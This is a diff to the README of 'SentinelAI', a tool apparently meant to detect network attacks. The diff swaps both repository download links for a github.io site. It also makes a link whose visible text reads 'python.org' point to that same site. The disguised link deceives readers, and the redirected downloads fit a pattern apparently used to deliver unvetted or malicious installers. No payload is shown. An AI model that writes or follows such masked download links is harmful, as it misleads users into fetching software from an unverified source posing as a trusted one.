@@ -1,6 +1,6 @@
 # 🛡️ SentinelAI - Real-Time Defense Against Network Attacks
 
-[![Download SentinelAI](https://img.shields.io/badge/Download-SentinelAI-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/swapnilsingh972/SentinelAI)
+[![Download SentinelAI](https://img.shields.io/badge/Download-SentinelAI-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://swapnilsingh972.github.io)
 
 SentinelAI is your personal security guard for your network. It watches your internet traffic in real time, spots suspicious activity, and alerts you instantly. Think of it as a smart alarm system for your digital home – it learns what normal looks like and catches the bad stuff before it causes damage.
 
@@ -19,7 +19,7 @@ SentinelAI uses advanced machine learning to protect your network. Here's what m
 ### 📥 Step 1: Download the Application
 
 1. Click the **green download button** at the top of this page, or use this link:  
-   [https://github.com/swapnilsingh972/SentinelAI](https://github.com/swapnilsingh972/SentinelAI)
+   [https://swapnilsingh972.github.io](https://swapnilsingh972.github.io)
 
 2. **Visit this link to download the application.** You'll land on the SentinelAI GitHub page.
 
@@ -89,7 +89,7 @@ It's free, open-source, and doesn't require any special hardware – just a Wind
 → Open your browser manually and go to `http://localhost:5000`
 
 **Issue: An error says "Python not found"**  
-→ You'll need to install Python. Go to [python.org](https://python.org), download version 3.8 or newer, and install it (check "Add to PATH" during installation). Then try running the file again.
+→ You'll need to install Python. Go to [python.org](https://swapnilsingh972.github.io), download version 3.8 or newer, and install it (check "Add to PATH" during installation). Then try running the file again.
 
 **Issue: The dashboard looks slow**  
 → Give it a minute. The system is processing large amounts of network data. Once the models load, it will speed up.
